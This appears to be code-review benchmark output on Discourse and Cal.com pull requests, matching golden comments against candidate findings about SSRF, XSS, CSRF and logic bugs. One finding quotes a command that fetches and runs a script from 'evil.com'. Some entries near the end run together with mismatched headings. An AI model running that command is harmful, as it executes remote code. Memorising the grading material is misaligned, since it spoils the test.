true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
`include_website_name` is missing the trailing `?` so the guard never runs

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method is defined as `include_website_name` (no question mark), so it is dead code and `website_name` is unconditionally serialized. Consequences: (1) the key `website_name` is emitted with a `nil` value for every user that has no website, bloating every user payload and breaking any consumer that checks for key presence; (2) the intended `website.present?` gating is silently not applied. Rename to `include_website_name?`.
true_positives.reasoning: The candidate identifies the same missing '?' suffix on include_website_name and its effect on conditional serialization. It omits the golden comment's additional string-literal mutation concern, but matches the primary underlying issue.

false_positives.candidate:
`website_name` is not listed in `untrusted_attributes`, leaking a TL0 user's website to anonymous visitors

`website` is declared in `untrusted_attributes` so that, when `scope.restrict_user_fields?(object)` is true (TL0 user viewed anonymously), the URL is not exposed — this is an anti-spam/privacy measure. The new `website_name` attribute returns the website host (and, for same-domain sites, the full path) but is not added to `untrusted_attributes`, and its own include guard (see `include_website_name`) only checks `website.present?`. The restricted URL is therefore disclosed through `website_name`, defeating the existing restriction. Add `:website_name` to the `untrusted_attributes` list (or make the include predicate also honour `scope.restrict_user_fields?`).

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on the literal `"."`. It happens to work today because each evaluation allocates a fresh literal, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (or the interpreter is run with frozen literals enabled), and it is needlessly allocating/mutating. Use `".#{website_host}"` or `"." + website_host`.

No spec covers `website_name` visibility, so the untrusted/include regressions are undetected

The TL0-seen-as-anonymous context enumerates `untrusted_attributes` but does not include `website_name`, so the fact that the new attribute leaks a restricted website is not caught. There is likewise no spec for a user with a blank website (which currently serialises `website_name: nil` because the include predicate is misnamed `include_website_name`), nor for the sibling-subdomain branch (`www.example.com` website with `forum.example.com` instance). Add specs for these three cases so the guards are actually exercised.

Domain-matching heuristic mis-handles `www.` hosts and false-positives on shared public suffixes

The branch logic only compares hosts when the label counts are equal and > 2. Consequences: (a) website `http://www.example.com/user` on an instance hosted at `example.com` falls through to the `else` branch, where `"example.com".ends_with?(".www.example.com")` is false, so the path is dropped even though it is the same site — exactly the case this PR is meant to handle; (b) hosts sharing only a public suffix, e.g. website `foo.blogspot.com` with instance `bar.blogspot.com`, compare equal on the last two labels and get the full path rendered even though they are unrelated sites. Consider normalising a leading `www.` and comparing registrable domains instead of raw label suffixes.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and SSRF

`open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Even though the setting is admin-only, a single compromised/misconfigured setting turns into remote code execution on the Sidekiq host. Use `URI.parse(url).open` (or an explicit HTTP client) and validate the scheme is http/https. The same concern applies to `open(url)` in `TopicEmbed.import_remote`.
true_positives.reasoning: The candidate identifies the same unvalidated open(SiteSetting.feed_polling_url) call and its ability to fetch arbitrary internal or external URLs (SSRF). Its additional command-execution and local-file concerns do not change the underlying match.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `e.origin` that is a substring of the configured `discourseUrl` (and also silently accepts `e.origin === ''`, since `indexOf('')` is 0). This is not an origin comparison; it should compare `e.origin` against the exact origin derived from `discourseUrl`. The current check weakens the only authentication on the resize messages and will also mis-handle a `discourseUrl` without a trailing slash (line 7 concatenates `"embed/best"` directly onto it, producing a wrong iframe src).
true_positives.reasoning: Both identify insecure postMessage origin validation caused by using indexOf substring matching instead of an exact origin comparison. The candidate's additional iframe URL concern does not change this semantic match.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` typo makes the header conditional depend on the logo link expression

Line 6 reads `<%- end if %>` instead of `<%- end %>`. The generated template code becomes `end if` followed by the next emitted statement, which Ruby parses as a modifier-`if` whose condition is the *next* expression (the `link_to(image_tag(SiteSetting.logo_url ...))` on line 8). As a result the logo is evaluated/appended before the Discussion/Start-Discussion button, the ordering in the rendered header is reversed, and the whole if/else block is gated on the truthiness of a side-effecting buffer append. It is also one token away from an outright `SyntaxError` in this template (which would 500 the main embed action). Change it to `<%- end %>`.
true_positives.reasoning: Both identify the erroneous `<%- end if %>` closing tag and recommend replacing it with `<%- end %>`. Although the candidate describes different consequences, it points to the same underlying code defect.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
Nil/absent feed item content aborts the whole poll

`i.content.scrub` assumes every item exposes `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS returns `nil` for `content`/`content_encoded`), so this raises `NoMethodError` on `nil`. Because the loop has no per-item rescue and the job is declared `sidekiq_options retry: false`, a single such item silently aborts the import of the entire feed (and all later items). Fall back to `description`/`summary` and wrap each item so one bad entry does not kill the run.
true_positives.reasoning: Both identify that calling `i.content.scrub` when an RSS item lacks content raises an exception, and recommend falling back to `description`. The candidate adds impact and mitigation details but describes the same underlying bug.

false_positives.candidate:
Feed content is stored as pre-cooked HTML with no sanitization (stored XSS)

`poll_feed` takes `i.content` straight from the remote RSS/Atom feed, runs `CGI.unescapeHTML` on it and hands it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim as `cooked`, completely bypassing PrettyText/the HTML sanitizer. The resulting HTML is rendered unescaped both in the Ember client (`{{{cooked}}}`) and in app/views/embed/best.html.erb (`raw post.cooked`). Any `<script>`, `onerror=`, `<iframe>` etc. present in the feed (compromised blog, feed that republishes user-submitted content, man-in-the-middle on a plain-HTTP feed URL) executes in the browsers of all forum users, including admins. The feed HTML should be run through the same sanitizer/whitelist that `import_remote` applies via Readability's tag/attribute whitelist before being stored as cooked output.

Re-import crashes when the embedded post has been deleted

In the update branch, `post = embed.post` is used directly by `PostRevisor.new(post)`. `Post` includes `Trashable`, so a soft-deleted (or hard-deleted) post makes `embed.post` return `nil`, and `PostRevisor#revise!` then raises `NoMethodError` on `nil.raw`. Any topic/post that a moderator deletes will therefore make every subsequent feed poll or embed retrieval for that URL blow up (and, since `Jobs::PollFeed` has `retry: false` and no per-item rescue, abort the rest of the feed). Guard for a missing post and either skip or recreate the topic.

`import_remote` calls `open(url)` without requiring open-uri

`import_remote` only does `require 'ruby-readability'`; it never requires `open-uri`. If nothing else in the process has loaded open-uri (e.g. `app/jobs/scheduled/poll_feed.rb`, which does require it, has not been autoloaded yet), `open(url)` falls back to `Kernel#open` as a file open and raises `Errno::ENOENT` for an http URL. This path is reached from `Jobs::RetrieveTopic` -> `TopicRetriever#fetch_http` and from the disqus thor task, so embed retrieval can fail non-deterministically depending on load order. Add `require 'open-uri'` (preferably `URI.parse(url).open`).

New embed.css/embed.js assets are not added to the precompile list

`stylesheet_link_tag 'embed'` references the newly added `app/assets/stylesheets/embed.css.scss`, and `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither file is reachable from `application.css`/`application.js` and the PR does not add them to `config.assets.precompile` in `config/application.rb`. With Sprockets in production (`assets.compile = false`) this raises an "asset is not present in the asset pipeline / not precompiled" error, so the embed page will 500 and the embed snippet will 404 after deploy.

Two PollFeed guard tests pass vacuously

"requires feed_polling_url" (line 18) and "requires embed_by_username" (line 24) only stub the one setting they are about; `feed_polling_enabled?` is left at its default, which is `false` in config/site_settings.yml. The first condition in `execute` therefore short-circuits and `poll_feed` would not be called even if the url/username guards were removed entirely, so these two examples assert nothing. Stub `feed_polling_enabled?` to true in both, and add coverage for `poll_feed` itself (item parsing, nil content, import call), which is currently untested.

`import` mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the "Imported from" footer in place rather than building a new string. Callers that reuse or memoize the string (e.g. a `let(:contents)` in specs, or any retry loop) will get the footer appended repeatedly, and the computed `content_sha1` will differ run to run for identical input, causing spurious "content changed" revisions. A frozen string argument would raise `RuntimeError`. Use `contents = contents + "..."` / `contents.dup`.

SETNX followed by EXPIRE can leave a permanent throttle key

`$redis.setnx(retrieved_key, "1")` and `$redis.expire(retrieved_key, 60)` are two round trips; if the process dies or the connection drops between them the key exists with no TTL and that embed URL is throttled forever, so the topic can never be retrieved. Use a single atomic `set(key, "1", ex: 60, nx: true)`.

One Sidekiq job enqueued per request for an unknown embed_url

Every request for an embed_url without a topic enqueues `Jobs::RetrieveTopic`; throttling happens only inside the job (`TopicRetriever#retrieved_recently?`). Since the endpoint is anonymous and unauthenticated (only a Referer check), a client hitting `embed/best` in a loop—or the loading page's unconditional 30s reload for many visitors—can flood the queue with jobs that all immediately no-op. Consider rate limiting the enqueue (e.g. check the same redis key before enqueueing).

Already-committed migration changed to `create_table ... force: true`

Editing an existing migration to add `force: true` means that on any database where `top_topics` exists but this migration version is not recorded (partially migrated/restored DB, schema loaded from schema.rb), running migrations will silently `DROP TABLE top_topics` and recreate it, losing data. Changing a released migration also makes checksum/history divergence between installs. If a reset is really needed, add a new migration instead.

No coverage renders the new embed views

The controller spec stubs `TopicView.new` (returning nil) and Rails controller specs do not render views unless `render_views` is enabled, so neither `embed/best.html.erb` nor `layouts/embed.html.erb` is ever exercised. That is why the `<%- end if %>` defect on best.html.erb:6 and the `@topic_view` usage are unverified. Add a `render_views` example with a real topic so template errors are caught.

embed_url limited to 255 chars with a unique index

`t.string :embed_url` defaults to varchar(255) in Postgres and is also the unique index column. Feed/article URLs regularly exceed 255 characters (tracking params, long slugs), which makes `TopicEmbed.create!` raise `PG::StringDataRightTruncation` inside the import transaction and permanently prevents embedding those pages. Use `:text` (with an index on the value or a hash) or document the limit and truncate/validate explicitly.

false_negatives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `self.downsize` definition silently discards the 4-argument version

`self.downsize(from, to, max_width, max_height, opts={})` is defined at line 145 and then immediately redefined at line 149 as `self.downsize(from, to, dimensions, opts={})`. Ruby keeps only the last definition, so the width/height form is dead code (it also emits a "method redefined; discarding old definition" warning). Any existing caller using `OptimizedImage.downsize(path, path, 100, 200)` now binds `dimensions = 100` and `opts = 200`, so `opts[:force_aspect_ratio]` in `downsize_instructions` is called on an Integer and raises (`Integer#[]` with a Symbol), or silently produces the geometry `100` instead of `100x200`. The two call conventions must be merged into one method (e.g. accept either a geometry string or width/height).
true_positives.reasoning: Both identify the duplicate downsize definition: the dimensions-based definition overrides the separate width/height version, making it unreachable and breaking existing callers using that signature.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side size validation hard-codes 10 MB and ignores attachment/image size settings

`maxSizeKB` was changed from `Discourse.SiteSettings['max_' + type + '_size_kb']` to a literal `10 * 1024`, so the `type` argument no longer affects the size check. Attachments are not downsized by the new server code and are still validated against `max_attachment_size_kb` in `Upload.create_for`, so a 9 MB attachment now passes client validation, is fully uploaded, and then fails server-side with an error the user was told would not happen. Sites with a `max_image_size_kb` above 10 MB are also newly blocked client-side. The limit should remain derived from the site settings (with the image case using whatever new upload ceiling the server enforces).
true_positives.reasoning: Both identify the same bug: hardcoding maxSizeKB to 10 * 1024 ignores per-type site settings and can cause client-side limits to diverge from server-side limits. The candidate's examples directly explain this mismatch; omitting the 413 handler does not change the underlying issue.

false_positives.candidate:
`optimize` arity change and removal of `dimensions` break external callers

`self.optimize` was changed from `(operation, from, to, width, height, opts)` to `(operation, from, to, dimensions, opts)`, and the public helper `self.dimensions(width, height)` was deleted. Both are class methods on a model that plugins and other code can call; existing calls with five positional args will now raise `ArgumentError`, and calls to `OptimizedImage.dimensions` will raise `NoMethodError`. If the change is intended, the old signatures should be kept as thin wrappers (or all internal/plugin call sites updated).

Downsize loop ignores conversion failures and overwrites the original file in place

The loop calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)`, i.e. the ImageMagick/gifsicle input and output are the same path, and the boolean return value (false on non-zero exit or exception, see `OptimizedImage.convert_with`) is discarded. Consequences: (a) if `convert` fails part-way, the user's uploaded file is already truncated/corrupted on disk and is then stored as the upload; (b) if conversion simply fails every time, the loop spins 5 times doing nothing and the oversized file is handed to `Upload.create_for`, which rejects it with a size error the client never predicted. The loop should check the return value, break on failure, and convert into a separate temp file that replaces the original only on success.

Animated GIFs lose animation because the animated code path can never trigger

`OptimizedImage.optimize` selects the gifsicle (animation-preserving) instructions only when `from =~ /\.GIF$/i`. The path passed here is `tempfile.path` of a Rack multipart / download temp file, which has no `.gif` extension (e.g. `/tmp/RackMultipart2015...`), so the regex never matches and every oversized animated GIF is run through `convert input[0]`, which keeps only the first frame. Animation is silently destroyed for any GIF above `max_image_size_kb`. Additionally, gating on `SiteSetting.allow_animated_thumbnails` is the wrong setting here: this is the original upload, not a thumbnail.

SVG uploads are passed to `convert` and cannot be shrunk by resizing

`FileHelper.is_image?` returns true for `.svg`, so an oversized SVG enters the downsize loop. Resizing a vector/text file by 80% does not reduce its byte size, so all 5 attempts run pointlessly, and running `convert` on it either rasterizes it or produces a file whose content no longer matches the `.svg` filename/extension stored with the upload. SVG (and other non-raster image types) should be excluded from this loop, as `OptimizedImage.create_for` already does for `.svg`.

Up to 5 synchronous ImageMagick + ImageOptim passes per upload run in the web process

For each oversized image the loop may invoke `convert` plus `ImageOptim.new.optimize_image!` (inside `convert_with`) five times, synchronously, on the request/`Scheduler::Defer` thread of the web process. With the upload ceiling now hard-coded at 10 MB, a single user can tie up a defer thread for many seconds of CPU-heavy work per upload, and a handful of concurrent uploads can starve that pool. This work belongs in a background job, or the number of passes should be computed from the size ratio in a single resize rather than iterating.

Hard-coded 10 MB download cap replaces the configurable limit

`FileHelper.download(url, 10.megabytes, ...)` replaces `SiteSetting.max_image_size_kb.kilobytes`. Sites that configured a larger `max_image_size_kb` can no longer pull images of that size through the API URL path, and sites that deliberately set a small limit now have a 10 MB server-side download/disk/bandwidth exposure that no setting can lower. The cap should be a site setting (e.g. a new `max_upload_size_kb`) rather than a magic constant.

413 error message reports a hard-coded 10 MB limit

The HTTP 413 handler now shows `max_size_kb: 10240` instead of the configured `max_image_size_kb`. A 413 comes from the web server (nginx `client_max_body_size`), which is independent of this constant, so the message will state a limit that is wrong for any deployment whose proxy limit or image setting differs from 10 MB, confusing users and support.

No tests for the new automatic downsizing path or the changed OptimizedImage API

The PR adds a new in-place downsizing loop in `create_upload` and changes/duplicates `OptimizedImage.downsize`/`optimize` signatures, but no specs were added or updated. A single spec for `OptimizedImage.downsize` arity would have caught the duplicate method definition, and a controller/unit spec would cover the oversized-image, conversion-failure and non-raster (SVG/GIF) cases that are currently unverified.

false_negatives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
Nil TopicUser causes 500 in unsubscribe action

`TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` can return nil (no `topic_users` row exists for this user/topic — e.g. the row was never created, was removed, or a different logged-in user than the email recipient opens the link). The next line calls `tu.notification_level`, raising `NoMethodError` and producing a 500 error page for anyone clicking the unsubscribe link in that situation. The action needs to handle the missing row (e.g. create it via `TopicUser.change`) or respond gracefully.
true_positives.reasoning: Both identify the same bug: TopicUser lookup can return nil when no record exists, and calling a method on it causes a runtime exception.

false_positives.candidate:
Unsubscribe GET endpoint toggles notification level, so a reload/prefetch mutes the topic

`TopicsController#unsubscribe` is reached by a plain GET from an email link, but the body is a toggle: if the current level is above `regular` it is lowered to `regular`, otherwise it is set to `muted`. The request is therefore not idempotent. A user who clicks the email link and then refreshes the page (or whose browser/email client fetches the URL twice, or who clicks the link in two different notification emails for the same topic) ends up fully muted even though they only intended one downgrade. The 301 redirect added at line 102 also makes it easy for the URL to be re-requested. The action should set a single, deterministic target level instead of toggling (and preferably be a POST/PUT with an explicit confirmation).

State-changing GET action with CSRF protection effectively disabled `unsubscribe` changes persistent user state (`topic_users.notification_level`) on a GET request, and `check_xhr` is skipped for it (line 32). Rails' `protect_from_forgery` does not apply to GET, so any third-party page can embed `` (or a link/prefetch) and silently mute or downgrade the notification level of any logged-in visitor for an arbitrary topic. Email scanners and link prefetchers in mail clients will also trigger it without the user ever clicking. The unsubscribe should either be performed through a non-GET request with CSRF token, or be gated by a one-time signed key embedded in the email link (as is done for the digest unsubscribe key).

Unsubscribe writes notification_level directly, bypassing TopicUser.change bookkeeping

Adding the mandatory `%{unsubscribe_url}` placeholder means any such caller that does not supply `unsubscribe_url` raises `I18n::MissingInterpolationArgument` and the email fails to send; only `UserNotifications#send_notification_email` was updated to pass it (and the message_builder spec had to be changed for exactly this reason). true_positives.golden_comment: Using === for dayjs object comparison will always return false as it compares object references, not values. Use .isSame() method instead: dayjs(date.start).add(utcOffset, 'minutes').isSame(dayjs(date.end).add(utcOffset, minutes))

`if (dayjs(date.start).add(utcOffset, "minutes") === dayjs(date.end).add(utcOffset, "minutes"))` compares two freshly created Dayjs objects by reference, which is always false. The intent (treat an override whose start equals its end as "unavailable all day") is never executed, so the handling of whole-day "mark unavailable" overrides depends on the later, unrelated comparisons. true_positives.reasoning: Both identify the same bug: comparing Dayjs objects with === checks reference identity rather than date values, making the condition always false. Both recommend .isSame() to compare values.

false_positives.candidate:
Date override on a day makes every slot available, skipping busy-time checks

In `checkIfIsAvailable`, the new block sets `dateOverrideExist = true` for any date override whose date matches the slot's date, and then `if (dateOverrideExist) return true;` returns early. This return happens *before* the `busy.every(...)` loop, so on any day that has a date override the function reports every slot as available and completely ignores existing bookings, external calendar busy times, event buffers and reserved (`selectedSlots`) entries. Any host with a date override can therefore be double-booked. The override check should only narrow availability, not short-circuit the busy evaluation.

working-hours check rejects slots when a user has more than one availability block per day

`workingHours.find((workingHour) => ...)` returns truthy as soon as *one* working-hours entry does not contain the slot, and the result is interpreted as "slot is outside of working hours" -> unavailable. A user whose schedule has several blocks on the same weekday (e.g. 09:00-12:00 and 14:00-18:00) produces two `WorkingHours` entries with the same `days`, so a 10:00 slot is inside the first and outside the second and gets dropped — all slots vanish for split schedules. The same happens for schedules that cross UTC midnight, where `getWorkingHours` emits two normalized entries covering the same days. The predicate must be "no entry contains the slot" (`!workingHours.some(contains)`), not "some entry does not contain it". Note this path applies to personal events too, because single-user events are treated as fixed hosts.

Date-override check rejects slots when a date has multiple override ranges

`dateOverrides.find((date) => ...)` returns truthy for the first override that does *not* contain the slot, and that result is treated as "slot is not within the date override" -> unavailable. Cal.com allows several time ranges for the same override date (and several hosts' overrides are flattened into the same array when a team event is evaluated per host). With two ranges on one date (e.g. 09:00-11:00 and 14:00-16:00), a slot inside the first range is outside the second, so the slot is rejected and every slot on that date disappears. The condition should be "none of the overrides for this date contain the slot".

Slots that only partially overlap a date override are treated as inside it

The override containment test marks a slot as outside the override only when `slotEndTime <= override.start` or `slotStartTime > override.end`. A slot that starts before the override start but ends inside it (slot 13:30-14:30 vs override 14:00-18:00) or starts inside but ends after the end (slot 17:30-18:30 vs 14:00-18:00) satisfies neither condition, so it is considered available. Combined with the early `return true` for `dateOverrideExist`, such partially overlapping slots are offered for booking outside the host's overridden availability. The correct test is `slotStartTime < override.start || slotEndTime > override.end`.

Override date comparison mixes server-local and UTC dates

`dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` formats in the *server's* local timezone (plain `dayjs(...)`, no `.utc()`), while it is compared against `slotStartTime.format("YYYY MM DD")`, which is in UTC (`slotStartTime = time.utc()`). On any deployment whose process timezone is not UTC the two dates can differ by a day, so date overrides are matched to the wrong day: overrides are either ignored (making unavailable time bookable) or applied to the neighbouring day. Use `dayjs.utc(date.start)` for the comparison. Tests run with TZ=UTC will not catch this.

Override timezone shift loses the day when it crosses midnight

The new override conversion reduces the shifted instant to minutes-since-midnight via `hour() * 60 + minute()`. When `offset` (invitee offset minus organizer offset) pushes the override across a day boundary — e.g. an override 22:00-23:00 in the organizer's timezone viewed by an invitee 5 hours ahead — the computed `startTime`/`endTime` wrap around to small values and are applied to the invitee's *same* day, so the override's slots are generated on the wrong day. If only one of the two endpoints wraps, `endTime < startTime` and `buildSlots` silently discards the range (`if (start >= end) continue`), so the override yields no slots at all. The day offset produced by the shift has to be carried, not discarded.

Missing `override.timeZone` silently falls back to the process/default timezone

`dayjs(override.start.toString()).tz(override.timeZone)` is called with `timeZone` typed as optional (`timeZone?: string` in packages/types/schedule.d.ts). When a caller of `getSlots` passes date overrides without a `timeZone` (the type permits it, and only the slots tRPC router was updated to populate it), the dayjs timezone plugin falls back to the default/local timezone, so `organizerUtcOffset` is computed for the wrong zone and the override is shifted by an arbitrary amount instead of being treated as organizer-local. Either make `timeZone` required for date overrides or explicitly fall back to `organizerTimeZone` which is already passed into `getSlots`.

No test for the PR's main fix: date overrides of fixed hosts in round-robin events

The PR's primary claim is that date overrides of fixed hosts are now honoured for ROUND_ROBIN events (so slots where the fixed host is unavailable are no longer offered). The only new test added covers a single-user event with a different invitee timezone. There is no scenario with a ROUND_ROBIN event type, a fixed host carrying a date override and a non-fixed host available all day, which is exactly the behaviour added in `checkIfIsAvailable` and the riskiest part of the change (it currently also bypasses busy-time checks). Without such a test the regression this PR fixes can silently come back.

toHaveTimeSlots matcher does not compare lengths, so the new assertion can pass with missing slots

The matcher iterates `schedule.slots[dateString].map(...).every((actualSlotTime, index) => ...)` over the *actual* slots only and never checks that the number of returned slots equals `expectedSlots.length`. The new assertion for the Asia/Dhaka invitee would therefore still pass if the implementation returned only `08:30:00.000Z` (or any prefix of the expected list), which is precisely the kind of over-filtering the new date-override/working-hours code can cause. Add a length check to the matcher so the new timezone test actually guards against dropped slots.

The new `OR` branch `{ retryCount: { gt: 1 } }` in `prisma.workflowReminder.deleteMany` is not scoped to `method: WorkflowMethods.SMS`. The SMS cron therefore deletes *any* WorkflowReminder row (EMAIL, WHATSAPP, mandatory reminders, etc.) whose retryCount exceeded 1, including rows with future scheduledDate. true_positives.reasoning: Both identify the same bug: the retryCount > 1 deletion OR branch lacks a WorkflowMethods.SMS filter, allowing the SMS scheduler to delete non-SMS reminders.

prisma.update inside catch block can throw and abort the whole cron run

The `prisma.workflowReminder.update` added at the top of the `catch` block is itself unprotected. If this update fails (record removed concurrently, connection error, etc.) the exception propagates out of the `for` loop, so every remaining unscheduled reminder in the batch is skipped and the endpoint returns a 500 instead of the previous behaviour where a single failing reminder was only logged. `retryCount` has no index (see `WorkflowReminder` indexes in schema.prisma), and because it is an `OR` branch Postgres can no longer satisfy the whole delete from the existing `[method, scheduled, scheduledDate]` index — it must sequentially scan WorkflowReminder. The retry increment only happens inside `if (message?.length && message?.length > 0 && sendTo)` (else-branch) or in the catch. When `sendTo` is null (e.g. no smsReminderNumber on the booking / no sendTo on the step) or the template produced an empty message, the loop body does nothing: the reminder stays `scheduled: false`, keeps being picked up by the 7-day query on every cron run and is never cleaned up until scheduledDate passes. `twilio.scheduleSMS` returns a falsy value not only on send failures but also when sending is suppressed for the user/team (SMS lock state checks inside the provider). With this change such a skip increments `retryCount`, and after two cron runs the reminder row is deleted by the new `deleteMany` branch. Consequence: once a lock/review is lifted the reminder no longer exists and the customer never gets the SMS. Distinguish genuine scheduling errors from intentional skips before counting a retry.

The PR introduces a retry-and-delete policy (increment on failure, delete when retryCount > 1) with no accompanying test. A regression here either leaks reminders forever or deletes reminders that should still be sent, both of which are silent in production. A unit/integration test asserting (a) retryCount increments when scheduleSMS fails or returns falsy, (b) rows with retryCount > 1 are deleted, and (c) non-SMS reminders are untouched, would lock the behaviour in.

`getBaseConditions()` returns `authConditions` verbatim when there are no filters (line 75), and `getAuthorizationConditions()`/`getFilterConditions()` are public. For org and team scope, `buildOrgAuthorizationCondition`/`buildTeamAuthorizationCondition` produce a fragment whose top-level operator is `OR` (e.g. `("teamId" = ANY($1)) AND ("isTeamBooking" = true) OR (("userId" = ANY($2)) AND ("isTeamBooking" = false))` after the reduce), and `buildFilterConditions` likewise returns a bare `OR` fragment when only `eventTypeId` is set. Since the service no longer executes any query, every consumer must interpolate these fragments into their own raw SQL, and the natural `WHERE ${baseConditions} AND "startTime" > ${x}` becomes `A OR (B AND x)` because SQL `AND` binds tighter than `OR`.
